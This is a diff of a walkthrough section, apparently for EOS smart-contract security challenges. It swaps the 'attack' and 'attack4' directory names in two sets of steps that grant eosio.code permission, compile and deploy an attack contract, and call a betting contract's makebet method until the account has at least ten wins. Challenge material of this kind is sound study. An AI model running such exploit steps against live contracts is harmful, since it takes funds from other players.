@@ -36,8 +36,8 @@ The way to attack
 # set permissions
 cleos set account permission gllrgjlqclkp active '{"threshold": 1,"keys": [{"key": "EOS7fyKcyPhP5P4S5xXqLzYEFg5bYuYRvxzsX3UJ5W7vAxvXtgYAU","weight": 1}],"accounts":[{"permission":{"actor":"gllrgjlqclkp","permission":"eosio.code"},"weight":1}]}' owner -p gllrgjlqclkp@owner
 # Compile contract
-cd attack
-eosio-cpp -o attack.wasm attack.cpp
+cd attack4
+eosio-cpp -o attack4.wasm attack4.cpp
 # Deploy contract
 cleos set contract gllrgjlqclkp . -p gllrgjlqclkp@active
 # Call the makebet method multiple times until the number of account wins is greater than or equal to 10
@@ -56,8 +56,8 @@ The way to attack
 # set permissions
 cleos set account permission btdaciaibmfp active '{"threshold": 1,"keys": [{"key": "EOS7fyKcyPhP5P4S5xXqLzYEFg5bYuYRvxzsX3UJ5W7vAxvXtgYAU","weight": 1}],"accounts":[{"permission":{"actor":"btdaciaibmfp","permission":"eosio.code"},"weight":1}]}' owner -p btdaciaibmfp@owner
 # Compile contract
-cd attack4
-eosio-cpp -o attack4.wasm attack4.cpp
+cd attack
+eosio-cpp -o attack.wasm attack.cpp
 # Deploy contract
 cleos set contract btdaciaibmfp . -p btdaciaibmfp@active
 # Call makebet method 10 times
